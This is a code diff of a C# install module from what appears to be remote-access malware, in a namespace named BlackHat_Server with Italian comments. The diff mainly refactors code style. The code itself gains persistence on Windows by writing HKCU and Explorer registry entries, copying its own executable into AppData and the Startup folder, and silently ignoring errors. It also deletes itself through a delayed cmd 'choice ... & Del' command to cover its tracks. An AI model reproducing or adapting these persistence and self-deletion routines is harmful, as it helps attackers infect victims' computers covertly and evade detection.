@@ -1,28 +1,25 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
 using System.IO;
-using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 
 namespace BlackHat_Server
 {
-    class InstallClass
+    internal class InstallClass
     {
         /// <summary>
-        /// Avvia thread di installazione
+        ///     Avvia thread di installazione
         /// </summary>
         public void StartInstallTHread()
         {
-            Thread t = new Thread(InstallServer);
+            var t = new Thread(InstallServer);
             t.IsBackground = true;
             t.Start();
         }
 
 
         /// <summary>
-        /// Installo il server
+        ///     Installo il server
         /// </summary>
         private void InstallServer()
         {
@@ -34,12 +31,11 @@ namespace BlackHat_Server
 
             if (ST_Client.Instance.bUseStartupFolder)
                 CopyInStartup(ST_Client.Instance.sStartupFileName);
-
         }
         //-----------------------------------------
 
         /// <summary>
-        /// Installo su registro HCKU
+        ///     Installo su registro HCKU
         /// </summary>
         /// <param name="regEntry"></param>
         /// <param name="appDataPath"></param>
@@ -47,11 +43,11 @@ namespace BlackHat_Server
         {
             try
             {
-                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
-                string finalDestination = Path.Combine(appData, appDataPath);
+                var finalDestination = Path.Combine(appData, appDataPath);
 
-                RegistryManager rm = new RegistryManager();
+                var rm = new RegistryManager();
 
                 rm.AddHKCUReg(regEntry, finalDestination);
 
@@ -67,16 +63,14 @@ namespace BlackHat_Server
             }
             catch (Exception ex)
             {
-                string errror = ex.Message;
+                var errror = ex.Message;
             }
-           
-
         }
         //------------------------------------------
 
 
         /// <summary>
-        /// Installo su registro EXPLORER
+        ///     Installo su registro EXPLORER
         /// </summary>
         /// <param name="regEntry"></param>
         /// <param name="appDataPath"></param>
@@ -84,15 +78,15 @@ namespace BlackHat_Server
         {
             try
             {
-                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
-                string finalDestination = Path.Combine(appData, appDataPath);
+                var finalDestination = Path.Combine(appData, appDataPath);
 
-                RegistryManager rm = new RegistryManager();
+                var rm = new RegistryManager();
 
                 rm.AddExplorerReg(regEntry, finalDestination);
 
-                
+
                 // COPIO IL FILE IN APPDATA SE NON ESISTE
                 if (!File.Exists(finalDestination))
                 {
@@ -104,62 +98,50 @@ namespace BlackHat_Server
             }
             catch
             {
-              
             }
-           
         }
         //------------------------------------------
 
 
         /// <summary>
-        /// Copio il server nella cartella startup con un nome FILE PASSATO
+        ///     Copio il server nella cartella startup con un nome FILE PASSATO
         /// </summary>
         /// <param name="filename"></param>
         private void CopyInStartup(string filename)
         {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string mynameEntire = Application.ExecutablePath;
-                       
+            var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            var mynameEntire = Application.ExecutablePath;
 
-            string finalDest = Path.Combine(path, filename);
+
+            var finalDest = Path.Combine(path, filename);
 
             try
             {
                 // SE NON ESISTE MI CREO IL FILE ALTRIMENTI L'HO GIà CREATO!
                 if (!File.Exists(finalDest))
                     File.Copy(mynameEntire, finalDest);
-
-
             }
             catch
             {
-                
             }
         }
         //-------------------------------------------------
 
 
         /// <summary>
-        /// Crea Processo CMD per l'eliminazione del file in esecuzione dopo 10 SEC
-        /// DOPO CHIUDE L'APPLICAZIONE!!!!!!!!!
-        /// 
+        ///     Crea Processo CMD per l'eliminazione del file in esecuzione dopo 10 SEC
+        ///     DOPO CHIUDE L'APPLICAZIONE!!!!!!!!!
         /// </summary>
         public void DeleteMySelf()
         {
+            var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\"", Application.ExecutablePath);
 
-            string arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\"", Application.ExecutablePath);
-
-            DosRunner dr = new DosRunner();
+            var dr = new DosRunner();
 
             dr.RunDosSelfDelete(arg);
 
             Application.Exit();
-            
         }
         //-----------------------------------------------
-
-
-
-
     }
 }
